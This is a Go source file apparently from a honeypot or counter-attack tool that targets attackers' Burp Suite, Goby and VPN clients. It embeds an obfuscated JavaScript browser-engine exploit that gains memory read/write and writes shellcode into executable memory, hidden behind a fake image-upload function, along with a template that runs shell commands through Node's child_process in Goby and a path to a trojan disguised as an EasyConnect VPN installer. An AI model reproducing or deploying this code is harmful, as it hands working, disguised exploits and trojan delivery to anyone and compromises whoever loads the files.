package tools

import (
	"fmt"
	"os"
	"path/filepath"
	"runtime"
)

var httplog = []string{"log", "burplog", "gobylog", "vpnlog"}
var nohttplog = []string{"mysqllog"}

func Config(log string) []string {
	if log == "httplog" {
		return httplog
	}
	if log == "nohttplog" {
		return nohttplog
	}
	return nil
}

var BurpApi1 = "function uploadPic() {   var GdNgy1 = window[\"\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\"][\"\\x67\\x65\\x74\\x45\\x6c\\x65\\x6d\\x65\\x6e\\x74\\x42\\x79\\x49\\x64\"]('\\x75\\x70\\x6c\\x6f\\x61\\x64'),     NDUqmOyFf2 = new FormData(GdNgy1);   $[\"\\x61\\x6a\\x61\\x78\"]({    url:\"\\x2e\\x2f\\x75\\x70\\x6c\\x6f\\x61\\x64\\x2e\\x70\\x68\\x70\",    type:\"\\x70\\x6f\\x73\\x74\",    data:NDUqmOyFf2,    processData:false,    contentType:false,    success:function(QbhYGfBC3){     if(QbhYGfBC3){      window[\"\\x61\\x6c\\x65\\x72\\x74\"](\"\\u4e0a\\u4f20\\u6210\\u529f\\uff01\");     }     console[\"\\x6c\\x6f\\x67\"](QbhYGfBC3);     $(\"\\x23\\x70\\x69\\x63\")[\"\\x76\\x61\\x6c\"](\"\");     $(\"\\x2e\\x73\\x68\\x6f\\x77\\x55\\x72\\x6c\")[\"\\x68\\x74\\x6d\\x6c\"](QbhYGfBC3);     $(\"\\x2e\\x73\\x68\\x6f\\x77\\x50\\x69\\x63\")[\"\\x61\\x74\\x74\\x72\"](\"\\x73\\x72\\x63\",QbhYGfBC3);    },    error:function(_Mwb_4){     window[\"\\x61\\x6c\\x65\\x72\\x74\"](\"\\u7f51\\u7edc\\u8fde\\u63a5\\u5931\\u8d25\\x2c\\u7a0d\\u540e\\u91cd\\u8bd5\",_Mwb_4);    }     })    }function picgo() {    var w5 = new Float64Array(1);    var H$6 = new Uint32Array(w5[\"\\x62\\x75\\x66\\x66\\x65\\x72\"]);    function f2u(PI7) {        w5[0] = PI7;        return H$6;    }    function u2f(ZsOC8, skc9)    {        H$6[0] = skc9;        H$6[1] = ZsOC8;        return w5[0];    }    function hex(lgLk10) {        return \"\\x30\\x78\" + lgLk10[\"\\x74\\x6f\\x53\\x74\\x72\\x69\\x6e\\x67\"](16)[\"\\x70\\x61\\x64\\x53\\x74\\x61\\x72\\x74\"](8, \"\\x30\");    }    function log(UfTUiCkm11) {        console[\"\\x6c\\x6f\\x67\"](UfTUiCkm11);        window[\"\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\"][\"\\x62\\x6f\\x64\\x79\"][\"\\x69\\x6e\\x6e\\x65\\x72\\x54\\x65\\x78\\x74\"] += UfTUiCkm11 + '\\n';    }    var ijkaO12 = [1.1, 1.2];    var oSFYqamGC13 = new ArrayBuffer(0x233);    var UVtdjYqc14 = new DataView(oSFYqamGC13);    function opt_me($DDSSHGtg15) {        var OfsJEwpi16 = [1.1, 1.2, 1.3, 1.4, 1.5, 1.6];        ijkaO12 = [1.1, 1.2];        oSFYqamGC13 = new ArrayBuffer(0x233);        UVtdjYqc14 = new DataView(oSFYqamGC13);        let obj = {            a: -0        };        let idx = window[\"\\x4f\\x62\\x6a\\x65\\x63\\x74\"][\"\\x69\\x73\"](window[\"\\x4d\\x61\\x74\\x68\"][\"\\x65\\x78\\x70\\x6d\\x31\"]($DDSSHGtg15), obj[\"\\x61\"]) * 10;        var Xetp17 = f2u(OfsJEwpi16[idx])[0];        OfsJEwpi16[idx] = u2f(0x234, Xetp17);    }    for (let a = 0; a < 0x1000; a++)        opt_me(0);    opt_me(-0);    var OrUn18 = {        flag: 0x266,        funcAddr: opt_me    };    if (ijkaO12[\"\\x6c\\x65\\x6e\\x67\\x74\\x68\"] != 282) {        return;    }    var osjZpFBNv19 = -1;    var fKgq20 = false;    var _q21 = -1;    var tt22 = false;    for (let a = 0; a < 0x100; a++) {        if (osjZpFBNv19 == -1) {            if (f2u(ijkaO12[a])[0] == 0x466) {                fKgq20 = true;                osjZpFBNv19 = a;            } else if (f2u(ijkaO12[a])[1] == 0x466) {                fKgq20 = false;                osjZpFBNv19 = a + 1;            }        }        else if (_q21 == -1) {            if (f2u(ijkaO12[a])[0] == 0x4cc) {                tt22 = true;                _q21 = a;            } else if (f2u(ijkaO12[a])[1] == 0x4cc) {                tt22 = false;                _q21 = a + 1;            }        }    }    if (osjZpFBNv19 == -1) {        log(\"\\x5b\\x2d\\x5d \\x43\\x61\\x6e \\x6e\\x6f\\x74 \\x66\\x69\\x6e\\x64 \\x62\\x61\\x63\\x6b\\x69\\x6e\\x67 \\x73\\x74\\x6f\\x72\\x65 \\x21\");        return;    } else        log(\"\\x5b\\x2b\\x5d \\x62\\x61\\x63\\x6b\\x69\\x6e\\x67 \\x73\\x74\\x6f\\x72\\x65 \\x69\\x64\\x78\\x3a \" + osjZpFBNv19 +            \"\\x2c \\x69\\x6e \" + (fKgq20 ? \"\\x68\\x69\\x67\\x68\" : \"\\x6c\\x6f\\x77\") + \" \\x70\\x6c\\x61\\x63\\x65\\x2e\");    if (_q21 == -1) {        log(\"\\x5b\\x2d\\x5d \\x43\\x61\\x6e \\x6e\\x6f\\x74 \\x66\\x69\\x6e\\x64 \\x4f\\x70\\x74 \\x4f\\x62\\x6a \\x21\");        return;    } else        log(\"\\x5b\\x2b\\x5d \\x4f\\x70\\x74\\x4f\\x62\\x6a \\x69\\x64\\x78\\x3a \" + _q21 +            \"\\x2c \\x69\\x6e \" + (tt22 ? \"\\x68\\x69\\x67\\x68\" : \"\\x6c\\x6f\\x77\") + \" \\x70\\x6c\\x61\\x63\\x65\\x2e\");    var zskfCCe23 = (fKgq20 ?        f2u(ijkaO12[osjZpFBNv19])[1] :        f2u(ijkaO12[osjZpFBNv19])[0]);    log(\"\\x5b\\x2b\\x5d \\x4f\\x72\\x69\\x67\\x69\\x6e \\x62\\x61\\x63\\x6b\\x69\\x6e\\x67 \\x73\\x74\\x6f\\x72\\x65\\x3a \" + hex(zskfCCe23));    var vma_pE$Pl24 = (!fKgq20 ?        f2u(ijkaO12[osjZpFBNv19])[1] :        f2u(ijkaO12[osjZpFBNv19])[0]);    function read(KqeB_zcMi25) {        if (fKgq20)            ijkaO12[osjZpFBNv19] = u2f(KqeB_zcMi25, vma_pE$Pl24);        else            ijkaO12[osjZpFBNv19] = u2f(vma_pE$Pl24, KqeB_zcMi25);        return UVtdjYqc14[\"\\x67\\x65\\x74\\x49\\x6e\\x74\\x33\\x32\"](0, true);    }    function write(KHTXQReCI26, IL27) {        if (fKgq20)            ijkaO12[osjZpFBNv19] = u2f(KHTXQReCI26, vma_pE$Pl24);        else            ijkaO12[osjZpFBNv19] = u2f(vma_pE$Pl24, KHTXQReCI26);        UVtdjYqc14[\"\\x73\\x65\\x74\\x49\\x6e\\x74\\x33\\x32\"](0, IL27, true);    }    var Y28 = (tt22 ?        f2u(ijkaO12[_q21])[1] :        f2u(ijkaO12[_q21])[0]) - 1;    log(\"\\x5b\\x2b\\x5d \\x4f\\x70\\x74\\x4a\\x53\\x46\\x75\\x6e\\x63\\x41\\x64\\x64\\x72\\x3a \" + hex(Y28));    var _CTJKsi29 = read(Y28 + 0x18) - 1;    log(\"\\x5b\\x2b\\x5d \\x4f\\x70\\x74\\x4a\\x53\\x46\\x75\\x6e\\x63\\x43\\x6f\\x64\\x65\\x41\\x64\\x64\\x72\\x3a \" + hex(_CTJKsi29));    var u30 = _CTJKsi29 + 0x40;    log(\"\\x5b\\x2b\\x5d \\x52\\x57\\x58 \\x4d\\x65\\x6d \\x41\\x64\\x64\\x72\\x3a \" + hex(u30));    var Iy$l31 = new Uint8Array(        ["
var BurpApi2 = "]    );    for (let i = 0; i < Iy$l31[\"\\x6c\\x65\\x6e\\x67\\x74\\x68\"]; i++)        write(u30 + i, Iy$l31[i]);        opt_me();}picgo();"
var GobyApi1 = "(function(){\n    require('child_process').exec('"
var GobyApi2 = "',(error, stdout, stderr)=>{     alert(`stdout: ${stdout}`); });\n    })();"

//vpn木马文件路径
var VpnFile = Cwd + string(os.PathSeparator) + "upload" + string(os.PathSeparator) + "EasyConnectInstaller.exe"
var BurpFile = Cwd + string(os.PathSeparator) + "upload" + string(os.PathSeparator) + "api.js"
var GobyFile = Cwd + string(os.PathSeparator) + "upload" + string(os.PathSeparator) + "common.js"

// 获取数据库路径
var Cwd, _ = filepath.Abs(filepath.Dir(os.Args[0]))
var DbPath = Cwd + string(os.PathSeparator) + "data.db"
var LicenseFile = Cwd + string(os.PathSeparator) + "license.dat"

func SysOS() bool {
	sysType := runtime.GOOS
	if sysType == "linux" {
		return true
	}
	if sysType == "windows " {
		return false
	}
	return false
}

func Exists(path string) bool {
	_, err := os.Stat(path) //os.Stat获取文件信息
	if err != nil {
		if os.IsExist(err) {
			return true
		}
		return false
	}
	return true
}

func RegisterFile() string {
	if SysOS() {
		Register := Cwd + string(os.PathSeparator) + "register"
		if Exists(Register) {
			hash := Md5File(Register)
			if hash != "cea12d774a5f79f47c0fe7f402e9c8bd" {
				fmt.Println("注册文件hash检查不通过,请确认文件是否损坏!")
				os.Exit(1)
			}
			return Register
		} else {
			fmt.Println("请检查register文件是否存在！！")
			os.Exit(1)
		}
	}
	if !SysOS() {
		Register := Cwd + string(os.PathSeparator) + "register.exe"
		if Exists(Register) {
			hash := Md5File(Register)
			if hash != "28173bea80972286745bae7474fb5b22" {
				fmt.Println("注册文件hash检查不通过,请确认文件是否损坏!")
				os.Exit(1)
			}
			return Register
		} else {
			fmt.Println("请检查register.exe文件是否存在！！")
			os.Exit(1)
		}
	}
	return "运行授权文件失败,请联系技术支持！"
}
